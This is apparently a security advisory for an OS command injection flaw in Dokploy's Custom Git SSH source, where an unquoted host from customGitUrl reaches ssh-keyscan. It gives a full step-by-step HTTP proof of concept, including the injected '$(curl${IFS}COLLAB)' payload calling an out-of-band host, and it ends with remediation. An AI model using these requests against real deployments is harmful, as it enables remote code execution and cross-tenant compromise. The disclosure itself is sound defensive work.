repo.description:
| | |
|---|---|
| **Affected version** | v0.29.8 (commit `e9a0932b2`) |
| **Component** | `@dokploy/server` - Custom Git source (SSH variant) |
| **Authentication** | Authenticated; `member` with service deploy permission |
| **Status** | Confirmed via out-of-band code execution (Burp Collaborator) |

## 1. Summary
When a "Custom Git" source uses an SSH URL (and an SSH key is attached), Dokploy adds the host to
`known_hosts` via `ssh-keyscan -p ${port} ${domain}`, where `domain` is parsed from the user-supplied
`customGitUrl` and interpolated **unquoted**. The parser's regex permits shell metacharacters in the
host group, so a crafted SSH URL injects a command that executes via `/bin/sh -c` at deploy time. (The
same SSH-form `customGitUrl` also reaches the unquoted `git clone ... ${customGitUrl}` line - cf.
DOKPLOY-RCE-001 for the HTTPS variant.)

## 2. Affected code
- **Sink** - `packages/server/src/utils/providers/git.ts:114` (`addHostToKnownHostsCommand`)
  ```js
  return `ssh-keyscan -p ${port} ${domain} >> ${knownHostsPath};`;   // ${domain} unquoted
  ```
  Reached from `cloneGitRepository` (`git.ts:54-59`) when `isHttpOrHttps(customGitUrl) === false` and a
  `customGitSSHKeyId` is set; executed via `execAsync`/`execAsyncRemote` (`services/application.ts`).
- **Permissive parser** - `sanitizeRepoPathSSH` (`git.ts:119`) extracts the host with
  `(?<domain>[^\s/?#:]+)`, which blocks space `/ : ? #` but **allows `$ ( ) ; | & \` { }`**. So
  `customGitUrl = git@x$(curl${IFS}<host>)/o/r.git` yields `domain = x$(curl${IFS}<host>)`. `port` is
  `[0-9]{1,5}` (safe).
- **Entry point (no validation)** - `application.saveGitProvider` stores `customGitUrl` verbatim;
  `apiSaveGitProvider` has no content regex on `customGitUrl`.

## 3. Authorization / reachability
`saveGitProvider` + `deploy` are gated only by `checkServicePermissionAndAccess` (no org check for
owner/admin). Requires an SSH key to be attached (`customGitSSHKeyId`). Reachable by a `member`, and
cross-tenant by an owner/admin of another organization.

## 4. Proof of Concept (Burp)
**Step 0 - Authenticate** (Appendix A). **Step 1** - create a project + application → `APP_ID`.

**Step 2 - Create an SSH key** (the `privateKey` is format-validated, so use a real OpenSSH key, e.g.
`ssh-keygen -t ed25519 -N "" -f key`):
```http
POST /api/trpc/sshKey.create?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=COOKIE
Connection: close

{"0":{"json":{"name":"poc","publicKey":"ssh-ed25519 AAAA... poc","privateKey":"-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----\n","organizationId":"ORG_ID"}}}
```
Read the new `sshKeyId` via `GET /api/trpc/sshKey.all?batch=1&input=...`.

**Step 3 - Bind an SSH-form `customGitUrl` with the payload in the host, plus the SSH key:**
```http
POST /api/trpc/application.saveGitProvider?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=COOKIE
Connection: close

{"0":{"json":{"applicationId":"APP_ID","customGitUrl":"git@x$(curl${IFS}COLLAB)/o/r.git","customGitBranch":"main","customGitBuildPath":"/","customGitSSHKeyId":"SSH_KEY_ID","watchPaths":[],"enableSubmodules":false}}}
```

**Step 4 - Deploy:**
```http
POST /api/trpc/application.deploy?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=COOKIE
Connection: close

{"0":{"json":{"applicationId":"APP_ID"}}}
```

**Step 5 - Observe.** The Collaborator receives an HTTP request (`User-Agent: curl/8.18.0`) from the
Dokploy host - the `$(curl${IFS}COLLAB)` in the SSH URL's host executed via `ssh-keyscan`. The SSH
key's `lastUsedAt` is updated, confirming the SSH clone branch ran.

## 5. Impact
Arbitrary OS command execution on the host (or `serverId`) as the Dokploy server process. Cross-tenant
via an owner/admin of another organization.

## 6. Remediation
- Tighten the `sanitizeRepoPathSSH` host group to a strict hostname charset (`[A-Za-z0-9.-]+`) and
  reject shell metacharacters. Build `ssh-keyscan`/`git` invocations with `execFile`/argument arrays.
  Validate `customGitUrl` at the resolver. Enforce tenant isolation.

## Appendix A - Authentication
```http
POST /api/auth/sign-in/email HTTP/1.1
Host: TARGET
Content-Type: application/json
Connection: close

{"email":"USER@EXAMPLE.COM","password":"PASSWORD"}
```
repo.summary: OS Command Injection via SSH-form `customGitUrl` domain in `ssh-keyscan`
